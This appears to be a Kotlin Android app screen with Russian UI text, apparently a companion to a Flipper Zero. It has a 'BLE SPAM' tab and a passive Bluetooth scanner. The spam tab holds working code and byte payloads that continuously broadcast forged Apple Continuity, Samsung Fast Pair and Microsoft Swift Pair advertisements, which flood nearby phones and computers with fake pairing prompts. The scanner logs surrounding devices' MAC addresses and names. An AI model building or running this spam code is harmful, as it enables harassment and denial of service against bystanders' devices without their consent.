package com.flippercontrol.ui

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.le.*
import android.content.Context
import android.os.ParcelUuid
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.runtime.*
import androidx.compose.ui.*
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.*
import com.flippercontrol.core.FlipperRpcSession
import kotlinx.coroutines.*

data class BleSpamTarget(
    val id: String,
    val name: String,
    val icon: String,
    val description: String,
    val companyId: Int,
    val payload: ByteArray,
)

val bleSpamTargets = listOf(
    BleSpamTarget(
        id = "airpods_pro", name = "AirPods Pro", icon = "🎧",
        description = "Apple Continuity 0x004C / 0x0E20",
        companyId = 0x004C,
        payload = byteArrayOf(0x0E, 0x20, 0x01, 0x00, 0x00, 0x45, 0x12, 0xAF.toByte(),
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    ),
    BleSpamTarget(
        id = "airpods_max", name = "AirPods Max", icon = "🎧",
        description = "Apple Continuity 0x004C / 0x0A20",
        companyId = 0x004C,
        payload = byteArrayOf(0x0A, 0x20, 0x01, 0x00, 0x00, 0x45, 0x12, 0xAF.toByte(),
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    ),
    BleSpamTarget(
        id = "apple_watch", name = "Apple Watch", icon = "⌚",
        description = "Apple Continuity 0x004C / 0x0255",
        companyId = 0x004C,
        payload = byteArrayOf(0x02, 0x55, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    ),
    BleSpamTarget(
        id = "samsung_buds", name = "Samsung Buds", icon = "🎵",
        description = "Samsung Fast Pair 0x0075",
        companyId = 0x0075,
        payload = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02)
    ),
    BleSpamTarget(
        id = "ms_swift", name = "MS Swift Pair", icon = "🖥",
        description = "Microsoft Swift Pair 0x0006",
        companyId = 0x0006,
        payload = byteArrayOf(0x03, 0x00, 0x80.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    ),
)

private val companyNames = mapOf(
    0x004C to "Apple",    0x0075 to "Samsung",  0x0006 to "Microsoft",
    0x00E0 to "Google",   0x0157 to "Huawei",   0x0499 to "Ruuvi",
    0x0059 to "Nordic",   0x03DA to "Xiaomi",   0x02E5 to "Espressif",
    0x0117 to "Sony",     0x0010 to "Qualcomm", 0x08D3 to "Meta/Oculus",
    0x0171 to "Honor",    0x0069 to "TI",       0x0001 to "Ericsson",
)

data class ScannedDevice(
    val mac: String,
    val name: String?,
    val rssi: Int,
    val companyId: Int?,
    val company: String?,
    val seenAt: String,
)

@SuppressLint("MissingPermission")
@Composable
fun BleScreen(
    session: FlipperRpcSession,
    onBack: () -> Unit
) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    var tab by remember { mutableIntStateOf(0) }
    var spamTarget by remember { mutableStateOf(bleSpamTargets[0]) }
    var isSpamming by remember { mutableStateOf(false) }
    var pktCount by remember { mutableLongStateOf(0L) }
    var spamError by remember { mutableStateOf("") }

    var scannedDevices by remember { mutableStateOf<List<ScannedDevice>>(emptyList()) }
    var isScanning by remember { mutableStateOf(false) }

    val adapter = remember {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
    }

    // Stop spam when leaving screen
    DisposableEffect(Unit) {
        onDispose {
            if (isSpamming) {
                try { adapter?.bluetoothLeAdvertiser?.stopAdvertising(advertiseCallback) } catch (_: Exception) {}
                isSpamming = false
            }
        }
    }

    Column(
        Modifier
            .fillMaxSize()
            .background(FlipperTheme.bg)
            .padding(16.dp)
    ) {
        TopBar(title = "BLUETOOTH", color = FlipperTheme.purple, onBack = onBack)

        Row(
            Modifier.fillMaxWidth()
                .background(FlipperTheme.surface, RoundedCornerShape(10.dp)).padding(4.dp),
            horizontalArrangement = Arrangement.spacedBy(4.dp)
        ) {
            listOf("BLE SPAM", "СКАНЕР").forEachIndexed { i, label ->
                Box(
                    Modifier.weight(1f).clickable { tab = i }
                        .background(
                            if (i == tab) FlipperTheme.purpleDim else Color.Transparent,
                            RoundedCornerShape(8.dp)
                        )
                        .border(
                            if (i == tab) 1.dp else 0.dp,
                            FlipperTheme.purple.copy(0.4f), RoundedCornerShape(8.dp)
                        )
                        .padding(vertical = 8.dp),
                    contentAlignment = Alignment.Center
                ) {
                    androidx.compose.material3.Text(label,
                        color = if (i == tab) FlipperTheme.purple else FlipperTheme.textSecondary,
                        fontSize = 11.sp, fontFamily = FlipperTheme.mono,
                        fontWeight = if (i == tab) FontWeight.Bold else FontWeight.Normal)
                }
            }
        }

        Spacer(Modifier.height(16.dp))

        when (tab) {
            0 -> BleSpamTab(
                targets = bleSpamTargets,
                selected = spamTarget,
                onSelect = { spamTarget = it },
                isSpamming = isSpamming,
                pktCount = pktCount,
                error = spamError,
                onToggle = {
                    if (!isSpamming) {
                        spamError = ""
                        val advertiser = adapter?.bluetoothLeAdvertiser
                        if (advertiser == null) {
                            spamError = "BLE реклама не поддерживается на этом устройстве"
                            return@BleSpamTab
                        }
                        val settings = AdvertiseSettings.Builder()
                            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                            .setConnectable(false)
                            .setTimeout(0)
                            .build()
                        val data = AdvertiseData.Builder()
                            .addManufacturerData(spamTarget.companyId, spamTarget.payload)
                            .build()
                        advertiser.startAdvertising(settings, data, object : AdvertiseCallback() {
                            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                                isSpamming = true
                                scope.launch {
                                    while (isSpamming) {
                                        pktCount++
                                        delay(30)
                                    }
                                }
                            }
                            override fun onStartFailure(errorCode: Int) {
                                spamError = "Ошибка BLE рекламы: код $errorCode"
                            }
                        }.also { advertiseCallback = it })
                    } else {
                        try {
                            adapter?.bluetoothLeAdvertiser?.stopAdvertising(advertiseCallback)
                        } catch (_: Exception) {}
                        isSpamming = false
                    }
                }
            )
            1 -> BleScannerTab(
                devices = scannedDevices,
                isScanning = isScanning,
                onToggle = {
                    if (!isScanning) {
                        scannedDevices = emptyList()
                        val scanner = adapter?.bluetoothLeScanner
                        if (scanner == null) {
                            return@BleScannerTab
                        }
                        isScanning = true
                        val settings = ScanSettings.Builder()
                            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                            .build()
                        scanCallback = object : ScanCallback() {
                            override fun onScanResult(callbackType: Int, result: ScanResult) {
                                val mac = result.device.address
                                val name = result.device.name
                                val rssi = result.rssi
                                val mfrData = result.scanRecord?.manufacturerSpecificData
                                val companyId = if (mfrData != null && mfrData.size() > 0) mfrData.keyAt(0) else null
                                val company = companyId?.let { companyNames[it] ?: "ID:0x%04X".format(it) }
                                val time = java.text.SimpleDateFormat("HH:mm:ss",
                                    java.util.Locale.getDefault()).format(java.util.Date())
                                val dev = ScannedDevice(mac, name, rssi, companyId, company, time)
                                scannedDevices = listOf(dev) +
                                    scannedDevices.filter { it.mac != mac }.take(99)
                            }
                        }
                        scanner.startScan(null, settings, scanCallback)
                    } else {
                        try {
                            adapter?.bluetoothLeScanner?.stopScan(scanCallback)
                        } catch (_: Exception) {}
                        isScanning = false
                    }
                }
            )
        }
    }
}

// Mutable holders for callbacks (one active at a time per screen instance)
private var advertiseCallback: AdvertiseCallback = object : AdvertiseCallback() {}
private var scanCallback: ScanCallback = object : ScanCallback() {}

@Composable
fun BleSpamTab(
    targets: List<BleSpamTarget>,
    selected: BleSpamTarget,
    onSelect: (BleSpamTarget) -> Unit,
    isSpamming: Boolean,
    pktCount: Long,
    error: String,
    onToggle: () -> Unit
) {
    Column {
        androidx.compose.material3.Text("ЦЕЛЬ",
            color = FlipperTheme.textSecondary, fontSize = 10.sp,
            fontFamily = FlipperTheme.mono, letterSpacing = 2.sp)
        Spacer(Modifier.height(8.dp))

        targets.chunked(2).forEach { row ->
            Row(Modifier.fillMaxWidth().padding(bottom = 8.dp),
                horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                row.forEach { target ->
                    val sel = target.id == selected.id
                    Box(
                        Modifier.weight(1f).clickable { onSelect(target) }
                            .border(1.dp,
                                if (sel) FlipperTheme.purple.copy(0.7f) else FlipperTheme.border,
                                RoundedCornerShape(10.dp))
                            .background(
                                if (sel) FlipperTheme.purpleDim else FlipperTheme.surface,
                                RoundedCornerShape(10.dp))
                            .padding(12.dp)
                    ) {
                        Column {
                            androidx.compose.material3.Text(target.icon, fontSize = 20.sp)
                            Spacer(Modifier.height(4.dp))
                            androidx.compose.material3.Text(target.name,
                                color = if (sel) FlipperTheme.purple else FlipperTheme.textPrimary,
                                fontSize = 11.sp, fontFamily = FlipperTheme.mono,
                                fontWeight = FontWeight.Bold)
                            androidx.compose.material3.Text(target.description,
                                color = FlipperTheme.textSecondary, fontSize = 9.sp,
                                fontFamily = FlipperTheme.mono)
                        }
                    }
                }
                if (row.size == 1) Spacer(Modifier.weight(1f))
            }
        }

        if (error.isNotEmpty()) {
            androidx.compose.material3.Text(error,
                color = FlipperTheme.red, fontSize = 11.sp, fontFamily = FlipperTheme.mono)
            Spacer(Modifier.height(8.dp))
        }

        if (pktCount > 0) {
            Box(Modifier.fillMaxWidth()
                .background(FlipperTheme.purpleDim, RoundedCornerShape(8.dp))
                .padding(12.dp)) {
                androidx.compose.material3.Text(
                    "Отправлено пакетов: $pktCount",
                    color = FlipperTheme.purple, fontSize = 13.sp,
                    fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.height(8.dp))
        }

        ActionButton(
            label = if (isSpamming) "⏹ СТОП SPAM" else "📡 НАЧАТЬ SPAM",
            color = FlipperTheme.purple,
            modifier = Modifier.fillMaxWidth(),
            onClick = onToggle
        )
    }
}

@Composable
fun BleScannerTab(
    devices: List<ScannedDevice>,
    isScanning: Boolean,
    onToggle: () -> Unit
) {
    Column {
        Row(Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically) {
            androidx.compose.material3.Text(
                "НАЙДЕНО: ${devices.size}",
                color = FlipperTheme.textSecondary, fontSize = 10.sp,
                fontFamily = FlipperTheme.mono, letterSpacing = 2.sp)
            if (isScanning) AnimatedReceivingBadge()
        }

        Spacer(Modifier.height(8.dp))

        ActionButton(
            label = if (isScanning) "⏹ СТОП" else "🔍 СКАНИРОВАТЬ",
            color = FlipperTheme.purple,
            modifier = Modifier.fillMaxWidth(),
            onClick = onToggle
        )

        Spacer(Modifier.height(12.dp))

        if (devices.isEmpty()) {
            EmptyState("Нажми СКАНИРОВАТЬ.\nAndroid начнёт поиск BLE устройств вокруг.")
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                items(devices, key = { it.mac }) { dev ->
                    Row(
                        Modifier.fillMaxWidth()
                            .background(FlipperTheme.surface, RoundedCornerShape(10.dp))
                            .padding(horizontal = 12.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Icon by brand
                        val icon = when (dev.companyId) {
                            0x004C -> "🍎"
                            0x0075 -> "📱"
                            0x0006 -> "🖥"
                            0x00E0 -> "🔵"
                            0x03DA -> "📱"
                            else   -> if (dev.name != null) "📡" else "❓"
                        }
                        androidx.compose.material3.Text(icon, fontSize = 18.sp,
                            modifier = Modifier.padding(end = 10.dp))
                        Column(Modifier.weight(1f)) {
                            val displayName = dev.name ?: dev.company ?: dev.mac
                            androidx.compose.material3.Text(
                                displayName,
                                color = if (dev.name != null) FlipperTheme.purple
                                        else if (dev.company != null) FlipperTheme.textPrimary
                                        else FlipperTheme.textSecondary,
                                fontSize = 13.sp, fontFamily = FlipperTheme.mono,
                                fontWeight = FontWeight.Bold)
                            val sub = buildString {
                                append(dev.mac)
                                if (dev.company != null && dev.name != null) append(" · ${dev.company}")
                                append(" · ${dev.seenAt}")
                            }
                            androidx.compose.material3.Text(sub,
                                color = FlipperTheme.textSecondary, fontSize = 10.sp,
                                fontFamily = FlipperTheme.mono)
                        }
                        val rssiColor = when {
                            dev.rssi > -60 -> FlipperTheme.green
                            dev.rssi > -75 -> FlipperTheme.yellow
                            else           -> FlipperTheme.red
                        }
                        Column(horizontalAlignment = Alignment.End) {
                            androidx.compose.material3.Text(
                                "${dev.rssi}",
                                color = rssiColor, fontSize = 13.sp,
                                fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
                            androidx.compose.material3.Text("dBm",
                                color = rssiColor.copy(alpha = 0.6f), fontSize = 9.sp,
                                fontFamily = FlipperTheme.mono)
                        }
                    }
                }
            }
        }
    }
}
